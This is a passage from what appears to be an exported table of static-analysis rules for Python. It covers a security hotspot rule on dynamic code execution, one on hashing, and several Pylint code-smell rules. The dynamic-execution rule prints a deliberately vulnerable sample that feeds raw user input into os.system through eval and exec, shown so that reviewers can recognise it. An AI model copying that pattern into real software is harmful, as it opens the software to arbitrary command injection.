  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802"">CVE-2017-9802</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9182"">CVE-2016-9182</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000210"">CVE-2018-1000210</a> </li>
</ul>
<p>It is dangerous to execute unknown code in your process. Such <a href=""https://www.owasp.org/index.php/Code_Injection"">Injected Code</a> can either
run on the server or in the client (exemple: XSS attack).</p>
<p>This rule marks for review each occurence of such dynamic code execution. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from a untrusted source and hasn't been sanitized. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href=""https://en.wikipedia.org/wiki/Sandbox_(computer_security)"">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a
href=""https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager"">Security Managers</a> in java, <a
href=""https://www.w3schools.com/tags/att_iframe_sandbox.asp"">iframes</a> and <a href=""https://en.wikipedia.org/wiki/Same-origin_policy"">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<h2>Questionable Code Example</h2>
<pre>
import os

value = input()
command = 'os.system(""%s"")' % value

def evaluate(command, file, mode):
    eval(command)  # Questionable.

eval(command)  # Questionable. Dynamic code

def execute(code, file, mode):
    exec(code)  # Questionable.
    exec(compile(code, file, mode))  # Questionable.

exec(command)  # Questionable.
</pre>
<h2>Exceptions</h2>
<p>None</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  ('Eval Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
  ('Unsafe Reflection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
</ul>",python:S1523,py,Python,"<p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807"">CVE-2017-9807</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802"">CVE-2017-9802</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9182"">CVE-2016-9182</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000210"">CVE-2018-1000210</a> </li>
</ul>
<p>It is dangerous to execute unknown code in your process. Such <a href=""https://www.owasp.org/index.php/Code_Injection"">Injected Code</a> can either
run on the server or in the client (exemple: XSS attack).</p>
<p>This rule marks for review each occurence of such dynamic code execution. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from a untrusted source and hasn't been sanitized. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href=""https://en.wikipedia.org/wiki/Sandbox_(computer_security)"">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a
href=""https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager"">Security Managers</a> in java, <a
href=""https://www.w3schools.com/tags/att_iframe_sandbox.asp"">iframes</a> and <a href=""https://en.wikipedia.org/wiki/Same-origin_policy"">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<h2>Questionable Code Example</h2>
<pre>
import os

value = input()
command = 'os.system(""%s"")' % value

def evaluate(command, file, mode):
    eval(command)  # Questionable.

eval(command)  # Questionable. Dynamic code

def execute(code, file, mode):
    exec(code)  # Questionable.
    exec(compile(code, file, mode))  # Questionable.

exec(command)  # Questionable.
</pre>
<h2>Exceptions</h2>
<p>None</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  ('Eval Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
  ('Unsafe Reflection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
</ul>",Dynamically executing code is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a7']",SECURITY_HOTSPOT
2019-03-14T10:00:54+0100,"<p>Hashing data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9233"">CVE-2018-9233</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5097"">CVE-2013-5097</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1051"">CVE-2007-1051</a> </li>
</ul>
<p>Cryptographic hash functions are used to uniquely identify information without storing their original form. When not done properly, an attacker can
steal the original information by guessing it (ex: with a <a href=""https://en.wikipedia.org/wiki/Rainbow_table"">rainbow table</a>), or replace the
original data with another one having the same hash.</p>
<p>This rule flags code that initiates hashing.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the hashed value is used in a security context. </li>
  <li> the hashing algorithm you are using is known to have vulnerabilities. </li>
  <li> <a href=""https://en.wikipedia.org/wiki/Salt_(cryptography)"">salts</a> are not automatically generated and applied by the hashing function.
  </li>
  <li> any generated salts are cryptographically weak or not credential-specific. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> for security related purposes, use only hashing algorithms which are <a
  href=""https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet"">currently known to be strong</a>. Avoid using algorithms like MD5 and SHA1
  completely in security contexts. </li>
  <li> do not define your own hashing- or salt algorithms as they will most probably have flaws. </li>
  <li> do not use algorithms that compute too quickly, like SHA256, as it must remain beyond modern hardware capabilities to perform brute force and
  dictionary based attacks. </li>
  <li> use a hashing algorithm that generate its own salts as part of the hashing. If you generate your own salts, make sure that a cryptographically
  strong salt algorithm is used, that generated salts are credential-specific, and finally, that the salt is applied correctly before the hashing.
  </li>
  <li> save both the salt and the hashed value in the relevant database record; during future validation operations, the salt and hash can then be
  retrieved from the database. The hash is recalculated with the stored salt and the value being validated, and the result compared to the stored
  hash. </li>
  <li> the strength of hashing algorithms often decreases over time as hardware capabilities increase. Check regularly that the algorithms you are
  using are still considered secure. If needed, rehash your data using a stronger algorithm. </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/916.html"">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/759.html"">MITRE, CWE-759</a> - Use of a One-Way Hash without a Salt </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/760.html"">MITRE, CWE-760</a> - Use of a One-Way Hash with a Predictable Salt </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Questionable Code Example</h2>
<p><code>hashlib</code> module</p>
<pre>
import hashlib

def hash_data(algorithm):
    hashlib.new(algorithm)  # Questionable

    hashlib.blake2b  # Questionable
    hashlib.blake2s  # Questionable
    hashlib.md5  # Questionable
    hashlib.pbkdf2_hmac # Questionable
    hashlib.sha1  # Questionable
    hashlib.sha224  # Questionable
    hashlib.sha256  # Questionable
    hashlib.sha384  # Questionable
    hashlib.sha3_224  # Questionable
    hashlib.sha3_256  # Questionable
    hashlib.sha3_384  # Questionable
    hashlib.sha3_512  # Questionable
    hashlib.sha512  # Questionable
    hashlib.shake_128  # Questionable
    hashlib.shake_256  # Questionable
    hashlib.scrypt  # Questionable
</pre>
<p><code>cryptography</code> library</p>
<pre>
from cryptography.hazmat.primitives import hashes


def my_hash(algorithm):
    hashes.Hash(algorithm)  # Questionable
</pre>
<p>Django</p>
<pre>
from django.contrib.auth.hashers import PBKDF2PasswordHasher, PBKDF2SHA1PasswordHasher, Argon2PasswordHasher, \
    BCryptSHA256PasswordHasher, BasePasswordHasher, BCryptPasswordHasher, SHA1PasswordHasher, MD5PasswordHasher, \
    UnsaltedSHA1PasswordHasher, UnsaltedMD5PasswordHasher, CryptPasswordHasher

from django.contrib.auth.hashers import make_password

# Changing default hashers

from django.conf import settings

def update_settings(value):
    settings.PASSWORD_HASHERS = value  # Questionable, and also a bad practice


# Creating custom Hasher

class MyBasePasswordHasher(BasePasswordHasher):  # Questionable
    pass

class MyPBKDF2PasswordHasher(PBKDF2PasswordHasher):  # Questionable
    pass

class MyPBKDF2SHA1PasswordHasher(PBKDF2SHA1PasswordHasher):  # Questionable
    pass

class MyArgon2PasswordHasher(Argon2PasswordHasher):  # Questionable
    pass

class MyBCryptSHA256PasswordHasher(BCryptSHA256PasswordHasher):  # Questionable
    pass

class MyBCryptPasswordHasher(BCryptPasswordHasher):  # Questionable
    pass

class MySHA1PasswordHasher(SHA1PasswordHasher):  # Questionable
    pass

class MyMD5PasswordHasher(MD5PasswordHasher):  # Questionable
    pass

class MyUnsaltedSHA1PasswordHasher(UnsaltedSHA1PasswordHasher):  # Questionable
    pass

class MyUnsaltedMD5PasswordHasher(UnsaltedMD5PasswordHasher):  # Questionable
    pass

class MyCryptPasswordHasher(CryptPasswordHasher):  # Questionable
    pass


# Calling make_password with a specific hasher name or salt should be reviewed
def my_make_password(password, salt, hasher):
    make_password(password, salt=salt)  # Questionable
    make_password(password, hasher=hasher)  # Questionable
    make_password(password, salt=salt, hasher=hasher)  # Questionable

    # No issue is raised when only the password is provided, then only the configuration should be reviewed
    make_password(password)  # OK
</pre>
<p>Django's ""global_settings.py"" configuration file</p>
<pre>
# NOTE: The following code raises issues only if the file is named ""global_settings.py"". This is the default
# name of Django configuration file

PASSWORD_HASHERS=[]  # Questionable
</pre>
<p>Werkzeug</p>
<pre>
from werkzeug.security import generate_password_hash

def hash_password(password):
    generate_password_hash(password)  # Questionable
</pre>
<p><code>passlib</code> module</p>
<pre>
import passlib.hash

passlib.hash.apr_md5_crypt  # Questionable
passlib.hash.argon2  # Questionable
passlib.hash.atlassian_pbkdf2_sha1  # Questionable
passlib.hash.bcrypt  # Questionable
passlib.hash.bcrypt_sha256  # Questionable
passlib.hash.bigcrypt  # Questionable
passlib.hash.bsd_nthash  # Questionable
passlib.hash.bsdi_crypt  # Questionable
passlib.hash.cisco_asa  # Questionable
passlib.hash.cisco_pix  # Questionable
passlib.hash.cisco_type7  # Questionable
passlib.hash.crypt16  # Questionable
passlib.hash.cta_pbkdf2_sha1  # Questionable
passlib.hash.des_crypt  # Questionable
passlib.hash.django_argon2  # Questionable
passlib.hash.django_bcrypt  # Questionable
passlib.hash.django_bcrypt_sha256  # Questionable
passlib.hash.django_des_crypt  # Questionable
passlib.hash.django_disabled  # Questionable
passlib.hash.django_pbkdf2_sha1  # Questionable
passlib.hash.django_pbkdf2_sha256  # Questionable
passlib.hash.django_salted_md5  # Questionable
passlib.hash.django_salted_sha1  # Questionable
passlib.hash.dlitz_pbkdf2_sha1  # Questionable
passlib.hash.fshp  # Questionable
passlib.hash.grub_pbkdf2_sha512  # Questionable
passlib.hash.hex_md4  # Questionable
passlib.hash.hex_md5  # Questionable
passlib.hash.hex_sha1  # Questionable
passlib.hash.hex_sha256  # Questionable
passlib.hash.hex_sha512  # Questionable
passlib.hash.htdigest  # Questionable
passlib.hash.ldap_bcrypt  # Questionable
passlib.hash.ldap_bsdi_crypt  # Questionable
passlib.hash.ldap_des_crypt  # Questionable
passlib.hash.ldap_hex_md5  # Questionable
passlib.hash.ldap_hex_sha1  # Questionable
passlib.hash.ldap_md5  # Questionable
passlib.hash.ldap_md5_crypt  # Questionable
passlib.hash.ldap_pbkdf2_sha1  # Questionable
passlib.hash.ldap_pbkdf2_sha256  # Questionable
passlib.hash.ldap_pbkdf2_sha512  # Questionable
passlib.hash.ldap_plaintext  # Questionable
passlib.hash.ldap_salted_md5  # Questionable
passlib.hash.ldap_salted_sha1  # Questionable
passlib.hash.ldap_sha1  # Questionable
passlib.hash.ldap_sha1_crypt  # Questionable
passlib.hash.ldap_sha256_crypt  # Questionable
passlib.hash.ldap_sha512_crypt  # Questionable
passlib.hash.lmhash  # Questionable
passlib.hash.md5_crypt  # Questionable
passlib.hash.msdcc  # Questionable
passlib.hash.msdcc2  # Questionable
passlib.hash.mssql2000  # Questionable
passlib.hash.mssql2005  # Questionable
passlib.hash.mysql323  # Questionable
passlib.hash.mysql41  # Questionable
passlib.hash.nthash  # Questionable
passlib.hash.oracle10  # Questionable
passlib.hash.oracle11  # Questionable
passlib.hash.pbkdf2_sha1  # Questionable
passlib.hash.pbkdf2_sha256  # Questionable
passlib.hash.pbkdf2_sha512  # Questionable
passlib.hash.phpass  # Questionable
passlib.hash.plaintext  # Questionable
passlib.hash.postgres_md5  # Questionable
passlib.hash.roundup_plaintext  # Questionable
passlib.hash.scram  # Questionable
passlib.hash.scrypt  # Questionable
passlib.hash.sha1_crypt  # Questionable
passlib.hash.sha256_crypt  # Questionable
passlib.hash.sha512_crypt  # Questionable
passlib.hash.sun_md5_crypt  # Questionable
passlib.hash.unix_disabled  # Questionable
passlib.hash.unix_fallback  # Questionable
</pre>
<p><code>pynacl</code> library</p>
<pre>
import nacl.pwhash
from nacl.pwhash.argon2i import str as argon2i_str, kdf as argon2i_kdf
from nacl.pwhash.argon2id import str as argon2id_str, kdf as argon2id_kdf
from nacl.pwhash.scrypt import str as scrypt_str, kdf as scrypt_kdf

from nacl.hash import blake2b, sha256, sha512

blake2b  # Questionable
sha256  # Questionable
sha512  # Questionable

nacl.pwhash.str  # Questionable
nacl.pwhash.scryptsalsa208sha256_str  # Questionable
nacl.pwhash.kdf_scryptsalsa208sha256  # Questionable
nacl.pwhash.argon2id.str  # Questionable
nacl.pwhash.argon2i.str  # Questionable
nacl.pwhash.scrypt.str  # Questionable
nacl.pwhash.argon2id.kdf  # Questionable
nacl.pwhash.argon2i.kdf  # Questionable
nacl.pwhash.scrypt.kdf  # Questionable

argon2i_str  # Questionable
argon2id_str  # Questionable
scrypt_str  # Questionable
argon2i_kdf  # Questionable
argon2id_kdf  # Questionable
scrypt_kdf  # Questionable
</pre>",python:S4790,py,Python,"<p>Hashing data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9233"">CVE-2018-9233</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5097"">CVE-2013-5097</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1051"">CVE-2007-1051</a> </li>
</ul>
<p>Cryptographic hash functions are used to uniquely identify information without storing their original form. When not done properly, an attacker can
steal the original information by guessing it (ex: with a <a href=""https://en.wikipedia.org/wiki/Rainbow_table"">rainbow table</a>), or replace the
original data with another one having the same hash.</p>
<p>This rule flags code that initiates hashing.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the hashed value is used in a security context. </li>
  <li> the hashing algorithm you are using is known to have vulnerabilities. </li>
  <li> <a href=""https://en.wikipedia.org/wiki/Salt_(cryptography)"">salts</a> are not automatically generated and applied by the hashing function.
  </li>
  <li> any generated salts are cryptographically weak or not credential-specific. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> for security related purposes, use only hashing algorithms which are <a
  href=""https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet"">currently known to be strong</a>. Avoid using algorithms like MD5 and SHA1
  completely in security contexts. </li>
  <li> do not define your own hashing- or salt algorithms as they will most probably have flaws. </li>
  <li> do not use algorithms that compute too quickly, like SHA256, as it must remain beyond modern hardware capabilities to perform brute force and
  dictionary based attacks. </li>
  <li> use a hashing algorithm that generate its own salts as part of the hashing. If you generate your own salts, make sure that a cryptographically
  strong salt algorithm is used, that generated salts are credential-specific, and finally, that the salt is applied correctly before the hashing.
  </li>
  <li> save both the salt and the hashed value in the relevant database record; during future validation operations, the salt and hash can then be
  retrieved from the database. The hash is recalculated with the stored salt and the value being validated, and the result compared to the stored
  hash. </li>
  <li> the strength of hashing algorithms often decreases over time as hardware capabilities increase. Check regularly that the algorithms you are
  using are still considered secure. If needed, rehash your data using a stronger algorithm. </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/916.html"">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/759.html"">MITRE, CWE-759</a> - Use of a One-Way Hash without a Salt </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/760.html"">MITRE, CWE-760</a> - Use of a One-Way Hash with a Predictable Salt </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Questionable Code Example</h2>
<p><code>hashlib</code> module</p>
<pre>
import hashlib

def hash_data(algorithm):
    hashlib.new(algorithm)  # Questionable

    hashlib.blake2b  # Questionable
    hashlib.blake2s  # Questionable
    hashlib.md5  # Questionable
    hashlib.pbkdf2_hmac # Questionable
    hashlib.sha1  # Questionable
    hashlib.sha224  # Questionable
    hashlib.sha256  # Questionable
    hashlib.sha384  # Questionable
    hashlib.sha3_224  # Questionable
    hashlib.sha3_256  # Questionable
    hashlib.sha3_384  # Questionable
    hashlib.sha3_512  # Questionable
    hashlib.sha512  # Questionable
    hashlib.shake_128  # Questionable
    hashlib.shake_256  # Questionable
    hashlib.scrypt  # Questionable
</pre>
<p><code>cryptography</code> library</p>
<pre>
from cryptography.hazmat.primitives import hashes


def my_hash(algorithm):
    hashes.Hash(algorithm)  # Questionable
</pre>
<p>Django</p>
<pre>
from django.contrib.auth.hashers import PBKDF2PasswordHasher, PBKDF2SHA1PasswordHasher, Argon2PasswordHasher, \
    BCryptSHA256PasswordHasher, BasePasswordHasher, BCryptPasswordHasher, SHA1PasswordHasher, MD5PasswordHasher, \
    UnsaltedSHA1PasswordHasher, UnsaltedMD5PasswordHasher, CryptPasswordHasher

from django.contrib.auth.hashers import make_password

# Changing default hashers

from django.conf import settings

def update_settings(value):
    settings.PASSWORD_HASHERS = value  # Questionable, and also a bad practice


# Creating custom Hasher

class MyBasePasswordHasher(BasePasswordHasher):  # Questionable
    pass

class MyPBKDF2PasswordHasher(PBKDF2PasswordHasher):  # Questionable
    pass

class MyPBKDF2SHA1PasswordHasher(PBKDF2SHA1PasswordHasher):  # Questionable
    pass

class MyArgon2PasswordHasher(Argon2PasswordHasher):  # Questionable
    pass

class MyBCryptSHA256PasswordHasher(BCryptSHA256PasswordHasher):  # Questionable
    pass

class MyBCryptPasswordHasher(BCryptPasswordHasher):  # Questionable
    pass

class MySHA1PasswordHasher(SHA1PasswordHasher):  # Questionable
    pass

class MyMD5PasswordHasher(MD5PasswordHasher):  # Questionable
    pass

class MyUnsaltedSHA1PasswordHasher(UnsaltedSHA1PasswordHasher):  # Questionable
    pass

class MyUnsaltedMD5PasswordHasher(UnsaltedMD5PasswordHasher):  # Questionable
    pass

class MyCryptPasswordHasher(CryptPasswordHasher):  # Questionable
    pass


# Calling make_password with a specific hasher name or salt should be reviewed
def my_make_password(password, salt, hasher):
    make_password(password, salt=salt)  # Questionable
    make_password(password, hasher=hasher)  # Questionable
    make_password(password, salt=salt, hasher=hasher)  # Questionable

    # No issue is raised when only the password is provided, then only the configuration should be reviewed
    make_password(password)  # OK
</pre>
<p>Django's ""global_settings.py"" configuration file</p>
<pre>
# NOTE: The following code raises issues only if the file is named ""global_settings.py"". This is the default
# name of Django configuration file

PASSWORD_HASHERS=[]  # Questionable
</pre>
<p>Werkzeug</p>
<pre>
from werkzeug.security import generate_password_hash

def hash_password(password):
    generate_password_hash(password)  # Questionable
</pre>
<p><code>passlib</code> module</p>
<pre>
import passlib.hash

passlib.hash.apr_md5_crypt  # Questionable
passlib.hash.argon2  # Questionable
passlib.hash.atlassian_pbkdf2_sha1  # Questionable
passlib.hash.bcrypt  # Questionable
passlib.hash.bcrypt_sha256  # Questionable
passlib.hash.bigcrypt  # Questionable
passlib.hash.bsd_nthash  # Questionable
passlib.hash.bsdi_crypt  # Questionable
passlib.hash.cisco_asa  # Questionable
passlib.hash.cisco_pix  # Questionable
passlib.hash.cisco_type7  # Questionable
passlib.hash.crypt16  # Questionable
passlib.hash.cta_pbkdf2_sha1  # Questionable
passlib.hash.des_crypt  # Questionable
passlib.hash.django_argon2  # Questionable
passlib.hash.django_bcrypt  # Questionable
passlib.hash.django_bcrypt_sha256  # Questionable
passlib.hash.django_des_crypt  # Questionable
passlib.hash.django_disabled  # Questionable
passlib.hash.django_pbkdf2_sha1  # Questionable
passlib.hash.django_pbkdf2_sha256  # Questionable
passlib.hash.django_salted_md5  # Questionable
passlib.hash.django_salted_sha1  # Questionable
passlib.hash.dlitz_pbkdf2_sha1  # Questionable
passlib.hash.fshp  # Questionable
passlib.hash.grub_pbkdf2_sha512  # Questionable
passlib.hash.hex_md4  # Questionable
passlib.hash.hex_md5  # Questionable
passlib.hash.hex_sha1  # Questionable
passlib.hash.hex_sha256  # Questionable
passlib.hash.hex_sha512  # Questionable
passlib.hash.htdigest  # Questionable
passlib.hash.ldap_bcrypt  # Questionable
passlib.hash.ldap_bsdi_crypt  # Questionable
passlib.hash.ldap_des_crypt  # Questionable
passlib.hash.ldap_hex_md5  # Questionable
passlib.hash.ldap_hex_sha1  # Questionable
passlib.hash.ldap_md5  # Questionable
passlib.hash.ldap_md5_crypt  # Questionable
passlib.hash.ldap_pbkdf2_sha1  # Questionable
passlib.hash.ldap_pbkdf2_sha256  # Questionable
passlib.hash.ldap_pbkdf2_sha512  # Questionable
passlib.hash.ldap_plaintext  # Questionable
passlib.hash.ldap_salted_md5  # Questionable
passlib.hash.ldap_salted_sha1  # Questionable
passlib.hash.ldap_sha1  # Questionable
passlib.hash.ldap_sha1_crypt  # Questionable
passlib.hash.ldap_sha256_crypt  # Questionable
passlib.hash.ldap_sha512_crypt  # Questionable
passlib.hash.lmhash  # Questionable
passlib.hash.md5_crypt  # Questionable
passlib.hash.msdcc  # Questionable
passlib.hash.msdcc2  # Questionable
passlib.hash.mssql2000  # Questionable
passlib.hash.mssql2005  # Questionable
passlib.hash.mysql323  # Questionable
passlib.hash.mysql41  # Questionable
passlib.hash.nthash  # Questionable
passlib.hash.oracle10  # Questionable
passlib.hash.oracle11  # Questionable
passlib.hash.pbkdf2_sha1  # Questionable
passlib.hash.pbkdf2_sha256  # Questionable
passlib.hash.pbkdf2_sha512  # Questionable
passlib.hash.phpass  # Questionable
passlib.hash.plaintext  # Questionable
passlib.hash.postgres_md5  # Questionable
passlib.hash.roundup_plaintext  # Questionable
passlib.hash.scram  # Questionable
passlib.hash.scrypt  # Questionable
passlib.hash.sha1_crypt  # Questionable
passlib.hash.sha256_crypt  # Questionable
passlib.hash.sha512_crypt  # Questionable
passlib.hash.sun_md5_crypt  # Questionable
passlib.hash.unix_disabled  # Questionable
passlib.hash.unix_fallback  # Questionable
</pre>
<p><code>pynacl</code> library</p>
<pre>
import nacl.pwhash
from nacl.pwhash.argon2i import str as argon2i_str, kdf as argon2i_kdf
from nacl.pwhash.argon2id import str as argon2id_str, kdf as argon2id_kdf
from nacl.pwhash.scrypt import str as scrypt_str, kdf as scrypt_kdf

from nacl.hash import blake2b, sha256, sha512

blake2b  # Questionable
sha256  # Questionable
sha512  # Questionable

nacl.pwhash.str  # Questionable
nacl.pwhash.scryptsalsa208sha256_str  # Questionable
nacl.pwhash.kdf_scryptsalsa208sha256  # Questionable
nacl.pwhash.argon2id.str  # Questionable
nacl.pwhash.argon2i.str  # Questionable
nacl.pwhash.scrypt.str  # Questionable
nacl.pwhash.argon2id.kdf  # Questionable
nacl.pwhash.argon2i.kdf  # Questionable
nacl.pwhash.scrypt.kdf  # Questionable

argon2i_str  # Questionable
argon2id_str  # Questionable
scrypt_str  # Questionable
argon2i_kdf  # Questionable
argon2id_kdf  # Questionable
scrypt_kdf  # Questionable
</pre>",Hashing data is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a3', 'owasp-a6', 'sans-top25-porous', 'spring']",SECURITY_HOTSPOT
2019-02-05T09:11:56+0100,"This message is emitted when pylint detects that a comparison with a callable was made, which might suggest that some parenthesis were omitted, resulting in potential unwanted behaviour.",Pylint:W0143,py,Python,"This message is emitted when pylint detects that a comparison with a callable was made, which might suggest that some parenthesis were omitted, resulting in potential unwanted behaviour.","Comparing against a callable, did you omit the parenthesis?",[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,Used when an inline option is either badly formatted or can't be used inside modules.,Pylint:I0010,py,Python,Used when an inline option is either badly formatted or can't be used inside modules.,Unable to consider inline option,[],INFO,[],CODE_SMELL
2013-06-19T07:34:52+0200,Used when an inline option disables a message or a messages category.,Pylint:I0011,py,Python,Used when an inline option disables a message or a messages category.,Locally disabling message,[],INFO,[],CODE_SMELL
2013-06-19T07:34:52+0200,Used when an inline option enables a message or a messages category.,Pylint:I0012,py,Python,Used when an inline option enables a message or a messages category.,Locally enabling message,[],INFO,[],CODE_SMELL
2013-06-19T07:34:52+0200,Used to inform that the file will not be checked,Pylint:I0013,py,Python,Used to inform that the file will not be checked,Ignoring entire file,[],INFO,[],CODE_SMELL
2018-05-07T12:45:06+0200,"Used when a variable is accessed for non-existent member of C extension. Due to unavailability of source static analysis is impossible, but it may be performed by introspecting living objects in run-time.",Pylint:I1101,py,Python,"Used when a variable is accessed for non-existent member of C extension. Due to unavailability of source static analysis is impossible, but it may be performed by introspecting living objects in run-time.",Non-existent member of C extension,[],INFO,[],CODE_SMELL
2013-06-19T07:34:52+0200,"Used when except clauses are not in the correct order (from the more specific to the more generic). If you don't fix the order, some exceptions may not be caught by the most specific handler.",Pylint:E0701,py,Python,"Used when except clauses are not in the correct order (from the more specific to the more generic). If you don't fix the order, some exceptions may not be caught by the most specific handler.",Bad except clauses order,[],MAJOR,[],CODE_SMELL
2019-02-05T09:11:56+0100,"Used when using the syntax ""raise ... from ..."", where the exception context is not an exception, nor None.",Pylint:E0703,py,Python,"Used when using the syntax ""raise ... from ..."", where the exception context is not an exception, nor None.","Exception context set to something which is not an exception, nor None",[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,Used when an assignment is done on a function call but the inferred function doesn't return anything.,Pylint:E1111,py,Python,Used when an assignment is done on a function call but the inferred function doesn't return anything.,"Assigning result of a function call, where the function has no return",[],MAJOR,[],CODE_SMELL
2018-05-07T12:45:06+0200,Used when an if statement contains too many boolean expressions.,Pylint:R0916,py,Python,Used when an if statement contains too many boolean expressions.,Too many boolean expressions in if statement,[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,"Used when a custom exception class is raised but doesn't inherit from the builtin ""Exception"" class. This message can't be emitted when using Python >= 3.0.",Pylint:W0710,py,Python,"Used when a custom exception class is raised but doesn't inherit from the builtin ""Exception"" class. This message can't be emitted when using Python >= 3.0.","Exception doesn't inherit from standard ""Exception"" class",[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,"Used when Pylint detect the use of the builtin ""property"" on an old style class while this is relying on new style classes features. This message can't be emitted when using Python >= 3.0.",Pylint:W1001,py,Python,"Used when Pylint detect the use of the builtin ""property"" on an old style class while this is relying on new style classes features. This message can't be emitted when using Python >= 3.0.","Use of ""property"" on an old style class",[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,Used to inform that a built-in module has not been checked using the raw checkers.,Pylint:I0001,py,Python,Used to inform that a built-in module has not been checked using the raw checkers.,Unable to run raw checkers on built-in module,[],INFO,[],CODE_SMELL
2019-02-05T09:11:56+0100,Used when something is compared against itself.,Pylint:R0124,py,Python,Used when something is compared against itself.,Redundant comparison,[],MINOR,[],CODE_SMELL
2014-06-17T10:37:02+0200,Used when a class which doesn't inherit from Exception is used as an exception in an except clause.,Pylint:E0712,py,Python,Used when a class which doesn't inherit from Exception is used as an exception in an except clause.,Catching an exception which doesn't inherit from Exception,[],MINOR,[],CODE_SMELL
2014-06-17T10:37:02+0200,"Used when there is whitespace between the end of a line and the newline.
      <p>Added in Pylint 1.0.0.</p>
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS1131'>S1131</a> instead.</p>",Pylint:C0303,py,Python,"Used when there is whitespace between the end of a line and the newline.
      <p>Added in Pylint 1.0.0.</p>
      <p>This rule is deprecated, use {rule:python:S1131} instead.</p>",Trailing whitespace,[],MINOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,"Used when a module has too many lines, reducing its readability.
